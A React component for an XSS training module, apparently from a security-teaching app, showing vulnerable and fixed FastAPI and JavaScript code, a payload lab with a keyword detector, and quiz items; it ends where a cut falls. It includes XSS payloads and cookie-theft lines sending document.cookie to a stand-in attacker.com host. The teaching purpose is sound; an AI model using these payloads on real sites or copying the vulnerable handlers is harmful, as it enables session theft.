import React, { useState } from 'react';
import { AlertCircle, BookOpen, CheckCircle, Code, Eye, Home, Shield, Terminal, Trophy } from 'lucide-react';
import PythonCode from '../../components/PythonCode';
import Quiz from '../../components/Quiz';

const XSSModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`;

  const secureCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    # SAFE: Escape HTML special characters
    safe_query = html.escape(query)
    
    response = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {safe_query}</p>
        </body>
    </html>
    """
    return response`;

  const comparisonCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    
    # ❌ OLD (VULNERABLE): Direct insertion into HTML
    # html_content = f"<p>You searched for: {query}</p>"
    
    # ✅ NEW (SECURE): Escape HTML special characters
    safe_query = html.escape(query)
    html_content = f"<p>You searched for: {safe_query}</p>"
    
    return f"""
    <html>
        <body>
            <h1>Search Results</h1>
            {html_content}
        </body>
    </html>
    """`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes XSS attacks possible?",
      options: [
        "Weak passwords",
        "Inserting untrusted data into web pages without proper encoding",
        "Using old browsers",
        "Not using HTTPS"
      ],
      correct: 1,
      explanation: "XSS occurs when untrusted data (user input) is inserted into web pages without proper encoding/escaping, allowing malicious scripts to execute."
    },
    {
      id: 2,
      question: "What is the primary defense against XSS?",
      options: [
        "Using HTTPS only",
        "Disabling JavaScript",
        "HTML encoding/escaping user input",
        "Hiding the source code"
      ],
      correct: 2,
      explanation: "HTML encoding (escaping) converts special characters like < > & into safe HTML entities, preventing browsers from interpreting them as code."
    },
    {
      id: 3,
      question: "What does html.escape() do in Python?",
      options: [
        "Removes all HTML from input",
        "Converts special characters to HTML entities",
        "Encrypts the HTML",
        "Compresses the HTML"
      ],
      correct: 1,
      explanation: "html.escape() converts characters like < to &lt; and > to &gt;, making them display as text instead of being interpreted as HTML/JavaScript."
    },
    {
      id: 4,
      question: "Which type of XSS injects malicious scripts that are stored in the database?",
      options: [
        "Reflected XSS",
        "DOM-based XSS",
        "Stored (Persistent) XSS",
        "Client-side XSS"
      ],
      correct: 2,
      explanation: "Stored XSS saves malicious scripts in the database (e.g., in comments or profiles), which then execute when other users view that content."
    }
  ];

  const handleLabSubmit = () => {
    const lowerInput = labInput.toLowerCase();
    
    // Detect different types of XSS attacks
    const hasScript = lowerInput.includes('<script');
    const hasImgOnerror = lowerInput.includes('onerror');
    const hasOnload = lowerInput.includes('onload');
    const hasSvg = lowerInput.includes('<svg');
    const hasIframe = lowerInput.includes('<iframe');
    const hasEventHandler = lowerInput.includes('on') && (lowerInput.includes('=') || lowerInput.includes('click') || lowerInput.includes('mouse'));
    
    const isAttack = hasScript || hasImgOnerror || hasOnload || hasSvg || hasIframe || hasEventHandler;
    
    let attackType = '';
    let attackExplanation = '';
    
    if (hasScript) {
      attackType = 'Direct Script Injection';
      attackExplanation = 'The <script> tag would execute JavaScript immediately when the page loads. This is the most common XSS attack vector.';
    } else if (hasImgOnerror) {
      attackType = 'Image Event Handler Attack';
      attackExplanation = 'The onerror event handler fires when the image fails to load. Since "x" is not a valid image, the malicious JavaScript in onerror executes.';
    } else if (hasSvg && hasOnload) {
      attackType = 'SVG-based XSS';
      attackExplanation = 'SVG elements support onload events. This payload executes JavaScript when the SVG loads.';
    } else if (hasIframe) {
      attackType = 'Iframe Injection';
      attackExplanation = 'Iframes can load external malicious content or execute JavaScript via the src attribute.';
    } else if (hasEventHandler) {
      attackType = 'Event Handler Injection';
      attackExplanation = 'HTML event handlers (onclick, onmouseover, etc.) can execute JavaScript when triggered by user interaction.';
    }
    
    setLabResult({
      input: labInput,
      vulnerable: `<p>You searched for: ${labInput}</p>`,
      secure: `<p>You searched for: ${labInput.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;')}</p>`,
      isAttack,
      attackType,
      attackExplanation
    });
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Eye className="w-10 h-10 text-orange-400" />
            <h1 className="text-4xl font-bold">Cross-Site Scripting (XSS)</h1>
          </div>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding XSS - Three Main Types
              </h3>
              
              <p className="text-slate-300 mb-4">
                Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages. There are three primary types of XSS attacks, each with different characteristics and attack vectors.
              </p>

              {/* Type 1: Reflected XSS */}
              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-3">🔴 Type 1: Reflected XSS (Non-Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is reflected off the web server, typically through URL parameters or form inputs. The attack is delivered via a crafted link.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/search?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    When victim clicks the link, the script executes in their browser immediately.
                  </p>
                </div>
              </div>

              {/* Type 2: Stored XSS */}
              <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Type 2: Stored XSS (Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is permanently stored on the target server (database, comment system, user profile). Every user who views the affected page gets attacked.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """⚠️ VULNERABLE - Stores unsanitized input"""
    comments_db.append({"username": username, "comment": comment})
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """⚠️ VULNERABLE - Displays unsanitized stored data"""
    html = "<html><body><h1>Comments</h1>"
    for c in comments_db:
        # DANGEROUS: Directly embedding stored user input
        html += f"<p><b>{c['username']}</b>: {c['comment']}</p>"
    html += "</body></html>"
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Scenario:</p>
                  <p className="text-xs text-slate-300 mb-2">1. Attacker posts comment: <code className="bg-slate-700 px-1 rounded text-red-300">&lt;script&gt;steal_cookies()&lt;/script&gt;</code></p>
                  <p className="text-xs text-slate-300 mb-2">2. Malicious script saved to database</p>
                  <p className="text-xs text-slate-300">3. Every user viewing comments gets attacked automatically</p>
                  <p className="text-xs text-red-400 mt-2">⚠️ Most dangerous - affects all users, not just link clickers!</p>
                </div>
              </div>

              {/* Type 3: DOM-based XSS */}
              <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Type 3: DOM-Based XSS (Client-Side)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The vulnerability exists in client-side JavaScript code. The attack payload is never sent to the server - it's executed entirely in the browser's DOM.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Code:</p>
                  <pre className="bg-slate-800 p-3 rounded text-xs font-mono text-slate-300">
{`<script>
  // VULNERABLE: Reading from URL and inserting into DOM
  const params = new URLSearchParams(window.location.search);
  const userInput = params.get('name');
  
  // DANGEROUS: Direct insertion into innerHTML
  document.getElementById('welcome').innerHTML = 
    'Hello ' + userInput;
</script>`}
                  </pre>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/page#name=&lt;img src=x onerror=alert(1)&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    The fragment (#) isn't sent to server, so server-side protections don't help. Pure client-side vulnerability.
                  </p>
                </div>
              </div>

              {/* Comparison Table */}
              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">XSS Type Comparison:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Type</th>
                        <th className="text-left p-2 text-purple-400">Stored on Server?</th>
                        <th className="text-left p-2 text-purple-400">Attack Delivery</th>
                        <th className="text-left p-2 text-purple-400">Severity</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Reflected</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">Crafted URL/link</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Stored</td>
                        <td className="p-2 text-slate-300">Yes (database)</td>
                        <td className="p-2 text-slate-300">Automatic on page load</td>
                        <td className="p-2 text-red-400">Critical</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">DOM-Based</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">URL fragment manipulation</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Attack Examples
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4 mb-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🍪 Session Hijacking</h4>
                  <p className="text-sm text-slate-300 mb-2">Steal session cookies to impersonate users</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-red-300">
                      &lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;
                    </code>
                  </div>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🎣 Credential Theft</h4>
                  <p className="text-sm text-slate-300 mb-2">Create fake login forms to capture passwords</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-orange-300">
                      Inject fake form overlaying real login
                    </code>
                  </div>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🔀 Page Defacement</h4>
                  <p className="text-sm text-slate-300 mb-2">Modify page content to spread misinformation</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-yellow-300">
                      document.body.innerHTML='Hacked!'
                    </code>
                  </div>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📡 Keylogging</h4>
                  <p className="text-sm text-slate-300 mb-2">Record user keystrokes to capture sensitive data</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-purple-300">
                      addEventListener('keypress', log)
                    </code>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-red-400">Detailed Attack Scenarios:</h4>
                <div className="space-y-3 text-sm">
                  <div className="border-l-4 border-red-500 pl-3">
                    <p className="font-semibold text-red-400 mb-1">Cookie Theft Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects: <code className="bg-slate-800 px-2 py-1 rounded text-xs">&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></p>
                    <p className="text-slate-400 text-xs">Impact: Session token sent to attacker, who can now impersonate the victim</p>
                  </div>

                  <div className="border-l-4 border-orange-500 pl-3">
                    <p className="font-semibold text-orange-400 mb-1">Phishing Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects fake login form that submits to attacker's server</p>
                    <p className="text-slate-400 text-xs">Impact: Victims enter credentials thinking they're logging into legitimate site</p>
                  </div>

                  <div className="border-l-4 border-yellow-500 pl-3">
                    <p className="font-semibold text-yellow-400 mb-1">Malware Distribution:</p>
                    <p className="text-slate-300 mb-2">Inject script that redirects users to malware download sites</p>
                    <p className="text-slate-400 text-xs">Impact: Users' computers infected with ransomware, spyware, or trojans</p>
                  </div>

                  <div className="border-l-4 border-purple-500 pl-3">
                    <p className="font-semibold text-purple-400 mb-1">Cryptojacking:</p>
                    <p className="text-slate-300 mb-2">Inject cryptocurrency mining script that runs in victim's browser</p>
                    <p className="text-slate-400 text-xs">Impact: Victim's CPU used for mining, slowing down computer and increasing electricity costs</p>
                  </div>

                  <div className="border-l-4 border-blue-500 pl-3">
                    <p className="font-semibold text-blue-400 mb-1">Account Actions:</p>
                    <p className="text-slate-300 mb-2">Execute actions as the victim: post content, change settings, make purchases</p>
                    <p className="text-slate-400 text-xs">Impact: Unauthorized transactions, spam posts, reputation damage</p>
                  </div>
                </div>

                <div className="mt-4 p-3 bg-slate-800 rounded-lg">
                  <h5 className="font-bold mb-2 text-sm">📊 Real-World Statistics:</h5>
                  <ul className="space-y-1 text-xs text-slate-300">
                    <li>• XSS found in 53% of web applications (2023 security report)</li>
                    <li>• #1 most common vulnerability in OWASP Top 10</li>
                    <li>• Average remediation cost: $8,000 per vulnerability</li>
                    <li>• Famous victims: eBay, MySpace, YouTube, Facebook, Twitter</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Defense for Each XSS Type
              </h3>

              {/* Defense against Reflected XSS */}
              <div className="mb-6">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Reflected XSS:</h4>
                
                <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                  <button
                    onClick={() => setCodeView('comparison')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Before/After Comparison
                  </button>
                  <button
                    onClick={() => setCodeView('sidebyside')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Side-by-Side View
                  </button>
                </div>

                {codeView === 'comparison' ? (
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <PythonCode code={comparisonCode} />
                  </div>
                ) : (
                  <div className="grid md:grid-cols-2 gap-4">
                    <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-red-400 mb-3 text-sm">❌ BEFORE:</h5>
                      <PythonCode code={vulnerableCode} />
                    </div>
                    <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-green-400 mb-3 text-sm">✅ AFTER:</h5>
                      <PythonCode code={secureCode} />
                    </div>
                  </div>
                )}
              </div>

              {/* Defense against Stored XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Stored XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires TWO layers: sanitize on INPUT (storage) AND escape on OUTPUT (display)
                </p>
                
                <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html
# Note: Install bleach library for HTML sanitization
# pip install bleach
import bleach

app = FastAPI()
comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """✅ SECURE - Sanitize before storing"""
    
    # ✅ LAYER 1: Sanitize input before storing
    # Remove dangerous HTML tags, keep safe ones
    safe_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'u', 'p', 'br'],  # Allowed tags
        strip=True  # Remove disallowed tags
    )
    
    comments_db.append({
        "username": html.escape(username),
        "comment": safe_comment
    })
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """✅ SECURE - Escape on output as well"""
    html_content = "<html><body><h1>Comments</h1>"
    
    for c in comments_db:
        # ✅ LAYER 2: Escape again when displaying (defense in depth)
        safe_username = html.escape(c['username'])
        safe_comment = html.escape(c['comment'])
        html_content += f"<p><b>{safe_username}</b>: {safe_comment}</p>"
    
    html_content += "</body></html>"
    return html_content`} />
              </div>

              {/* Defense against DOM-based XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against DOM-Based XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires secure JavaScript practices on the client-side
                </p>
                
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-red-400 mb-2 text-sm">❌ Vulnerable JavaScript:</h5>
                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// DANGEROUS: Using innerHTML
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .innerHTML = 'Hello ' + name;`}
                    </pre>
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-green-400 mb-2 text-sm">✅ Secure JavaScript:</h5>
                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// SAFE: Using textContent
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .textContent = 'Hello ' + name;
  
// Alternative: Create text node
const textNode = 
  document.createTextNode(name);
element.appendChild(textNode);

// Or escape HTML manually
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
element.innerHTML = escapeHtml(userInput);`}
                    </pre>
                  </div>
                </div>
              </div>

              {/* Best Practices Summary */}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">XSS Prevention Best Practices:</h4>
                <div className="grid md:grid-cols-2 gap-3 text-sm">
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Server-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>HTML Escape:</strong> Use html.escape() for all user input</li>
                      <li>• <strong>Context-Aware Encoding:</strong> Different escaping for HTML, JS, CSS, URLs</li>
                      <li>• <strong>Input Validation:</strong> Whitelist allowed characters/patterns</li>
                      <li>• <strong>Content Security Policy (CSP):</strong> Restrict script sources</li>
                    </ul>
                  </div>
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Client-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>Use textContent:</strong> Never innerHTML for user data</li>
                      <li>• <strong>Create Text Nodes:</strong> Use document.createTextNode()</li>
                      <li>• <strong>Avoid eval():</strong> Never use eval with user input</li>
                      <li>• <strong>Framework Protection:</strong> Use React, Vue (auto-escape)</li>
                      <li>• <strong>Manual Escaping:</strong> Escape HTML before inserting</li>
                    </ul>
                  </div>
                </div>

                <div className="mt-3 p-3 bg-slate-800 rounded-lg">
                  <p className="font-semibold text-blue-400 mb-2 text-sm">Content Security Policy Example:</p>
                  <PythonCode code={`from fastapi import Response

@app.get("/")
async def root():
    response = Response(content="<html>...</html>")
    
    # Add CSP header to block inline scripts
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:;"
    )
    
    return response`} />
                </div>
              </div>
            </div>

            <button
              onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all"
            >
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 XSS Testing Lab - Test All Three Types</h3>
              
              {/* Reflected XSS Test */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-red-500/30">
                <h4 className="font-bold text-red-400 mb-3">🔴 Test 1: Reflected XSS</h4>
                <p className="text-sm text-slate-300 mb-3">Try injecting scripts via search query (non-persistent):</p>
                
                <div className="mb-3">
                  <label className="block mb-2 text-sm font-semibold">Enter Search Query:</label>
                  <div className="flex gap-3">
                    <input
                      type="text"
                      value={labInput}
                      onChange={(e) => setLabInput(e.target.value)}
                      placeholder="Try: <script>alert('Reflected XSS')</script>"
                      className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                    />
                    <button
                      onClick={handleLabSubmit}
                      className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold"
                    >
                      Test
                    </button>
                  </div>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Common Reflected XSS Payloads to Try:</p>
                  <div className="space-y-1 text-xs">
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;img src=x onerror=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;svg onload=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;body onload=alert('XSS')&gt;</code>
                  </div>
                </div>
              </div>

              {labResult && (
                <div className="space-y-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Output (Reflected):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
                      <code className="text-sm text-slate-300">{labResult.vulnerable}</code>
                    </div>
                    {labResult.isAttack && (
                      <div className="space-y-2">
                        <p className="text-sm text-red-400 font-semibold">
                          ⚠️ XSS Attack Detected: {labResult.attackType}
                        </p>
                        <p className="text-sm text-slate-300 bg-red-900/20 p-3 rounded">
                          {labResult.attackExplanation}
                        </p>
                      </div>
                    )}
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-2">✅ Secure Output (Escaped):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
                      <code className="text-sm text-slate-300">{labResult.secure}</code>
                    </div>
                    <div className="mt-3 p-3 bg-green-900/20 rounded">
                      <p className="text-sm text-green-400 font-semibold mb-2">✓ Safe! HTML Escaping Applied:</p>
                      <div className="text-xs text-slate-300 space-y-1">
                        <p>• <code className="bg-slate-800 px-1 rounded">&lt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;lt;</code> (less than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">&gt;</code> → <code className="bg-slate-800 px-1 rounded">&amp;gt;</code> (greater than)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">"</code> → <code className="bg-slate-800 px-1 rounded">&amp;quot;</code> (quote)</p>
                        <p>• <code className="bg-slate-800 px-1 rounded">'</code> → <code className="bg-slate-800 px-1 rounded">&amp;#x27;</code> (apostrophe)</p>
                      </div>
                      <p className="text-sm text-slate-300 mt-2">
                        These conversions ensure the browser displays the characters as text instead of interpreting them as HTML/JavaScript code.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Stored XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-orange-500/30">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Understanding Stored XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  In a real Stored XSS scenario, malicious scripts are saved to the database and execute every time ANY user views the affected page.
                </p>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Example Flow:</p>
                  <div className="space-y-2 text-xs text-slate-300">
                    <p>1. Attacker posts comment: <code className="bg-slate-900 px-2 py-1 rounded text-red-300">&lt;script&gt;steal_cookie()&lt;/script&gt;</code></p>
                    <p>2. Comment stored in database WITHOUT sanitization</p>
                    <p>3. When Alice views comments → script executes, her cookie stolen</p>
                    <p>4. When Bob views comments → script executes, his cookie stolen</p>
                    <p>5. Every visitor gets attacked automatically!</p>
                  </div>
                  <div className="mt-3 p-2 bg-orange-900/20 border border-orange-500/50 rounded">
                    <p className="text-xs text-orange-400 font-semibold">⚠️ This is why Stored XSS is CRITICAL severity - one attack affects all users!</p>
                  </div>
                </div>
              </div>

              {/* DOM-based XSS Explanation */}
              <div className="bg-slate-900 rounded-lg p-6 border border-yellow-500/30">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Understanding DOM-Based XSS</h4>
                <p className="text-sm text-slate-300 mb-3">
                  DOM-based XSS happens entirely in the browser. The malicious payload never reaches the server, making it invisible to server-side protections.
                </p>
                <div className="bg-slate-800 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Pattern:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-red-300">
{`// Reading from URL fragment (after #)
const name = window.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// Attack URL:
// https://site.com/page#<img src=x onerror=alert(1)>`}
                  </pre>
                </div>
                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Secure Alternative:</p>
                  <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-green-300">
{`// Use textContent instead of innerHTML
const name = window.location.hash.substring(1);
document.getElementById('output').textContent = name;

// Or create text nodes
const textNode = document.createTextNode(name);
document.getElementById('output').appendChild(textNode);

// Manual HTML escaping function
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}`}
                  </pre>
                </div>
              </div>
            </div>

            <button
              onClick={() => setActiveTab('quiz')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700"
            >
              Ready for the Quiz? →
            </button>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
